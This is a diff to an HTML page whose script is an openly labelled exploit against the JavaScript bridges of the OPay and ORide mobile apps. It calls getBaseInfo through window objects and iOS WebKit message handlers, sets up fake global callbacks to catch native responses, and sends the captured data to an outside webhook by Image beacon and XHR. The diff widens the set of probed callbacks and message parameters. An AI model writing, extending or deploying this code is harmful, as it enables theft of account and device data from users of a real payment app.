@@ -27,7 +27,6 @@
         div.innerText = '[' + new Date().toLocaleTimeString() + '] ' + msg;
         logDiv.appendChild(div);
 
-        // Exfiltrate via Image beacon for reliability
         var i = new Image();
         i.src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info');
       }
@@ -39,66 +38,68 @@
         xhr.send(JSON.stringify({ label: label, data: data, timestamp: new Date().toISOString() }));
       }
 
-      report('Exploit Cycle Started');
+      // Register global callbacks
+      var callbacks = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'opayCallback', 'bridgeCallback', 'receiveMessage', 'handleNativeMessage', 'callbackHandler', 'onReceiveNativeMessage', 'opayNativeCallback'];
+      callbacks.forEach(function (callbackName) {
+        window[callbackName] = function (data) {
+          report('GLOBAL CALLBACK TRIGGERED: ' + callbackName, 'success');
+          sendFullData('Callback_' + callbackName, data);
+          status.innerText = 'DATA CAPTURED';
+        };
+      });
+
+      report('Exploit Cycle Started (Callbacks Registered)');
       status.innerText = 'EXECUTING...';
 
       var bridgeNames = ['control', 'OPay3PartyContext', 'ORideContext'];
 
       bridgeNames.forEach(function (name) {
-        // 1. Direct Method (Android / Global Objects)
+        // 1. Direct Method
         try {
           if (window[name]) {
-            report('Global Bridge found: ' + name);
+            report('Global Bridge: ' + name);
             if (typeof window[name].getBaseInfo === 'function') {
               var info = window[name].getBaseInfo();
-              report('Success: window.' + name + '.getBaseInfo() returned data', 'success');
+              report('Success: ' + name + '.getBaseInfo()', 'success');
               sendFullData('DirectCall_' + name, info);
               status.innerText = 'DATA CAPTURED';
-            } else {
-              report('Bridge ' + name + ' exists but no getBaseInfo found');
             }
           }
-        } catch (e) {
-          report('Error DirectCall ' + name + ': ' + e.message, 'error');
-        }
+        } catch (e) { report('Error DirectCall ' + name + ': ' + e.message, 'error'); }
 
         // 2. iOS WebKit postMessage Method
         try {
           if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers[name]) {
-            report('iOS WebKit Handler found: ' + name);
+            report('iOS Handler: ' + name);
 
-            // Try action: getBaseInfo (standard)
-            report('Sending postMessage to ' + name + ' (action: getBaseInfo)');
-            window.webkit.messageHandlers[name].postMessage({ action: 'getBaseInfo' });
+            // Try action: getBaseInfo
+            window.webkit.messageHandlers[name].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
 
-            // Try call: getBaseInfo (optional variant)
+            // Try call: getBaseInfo
             setTimeout(function () {
-              window.webkit.messageHandlers[name].postMessage({ call: 'getBaseInfo' });
+              window.webkit.messageHandlers[name].postMessage({ call: 'getBaseInfo', callback: 'onGetBaseInfo' });
             }, 500);
 
             status.innerText = 'MESSAGE SENT';
           }
-        } catch (e) {
-          report('Error WebKit ' + name + ': ' + e.message, 'error');
-        }
+        } catch (e) { report('Error WebKit ' + name + ': ' + e.message, 'error'); }
       });
 
-      // Catch-all: Check all webkit handlers
-      try {
-        if (window.webkit && window.webkit.messageHandlers) {
-          var allHandlers = Object.keys(window.webkit.messageHandlers);
-          if (allHandlers.length > 0) {
-            report('All Detected iOS Handlers: ' + allHandlers.join(', '));
-          }
-        }
-      } catch (e) { }
+      // Special check for OPay3PartyContext with action: getBaseInfo
+      if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.OPay3PartyContext) {
+        setTimeout(function () {
+          report('Retrying OPay3PartyContext with variety of params');
+          window.webkit.messageHandlers.OPay3PartyContext.postMessage({ "method": "getBaseInfo", "callback": "onGetBaseInfo" });
+          window.webkit.messageHandlers.OPay3PartyContext.postMessage({ "cmd": "getBaseInfo", "cb": "onGetBaseInfo" });
+        }, 1000);
+      }
 
       setTimeout(function () {
         report('Exploit Cycle Complete');
-        if (status.innerText !== 'DATA CAPTURED') {
+        if (status.innerText !== 'DATA CAPTURED' && status.innerText !== 'MESSAGE SENT') {
           status.innerText = 'IDLE';
         }
-      }, 3000);
+      }, 5000);
     })();
   </script>
 </body>
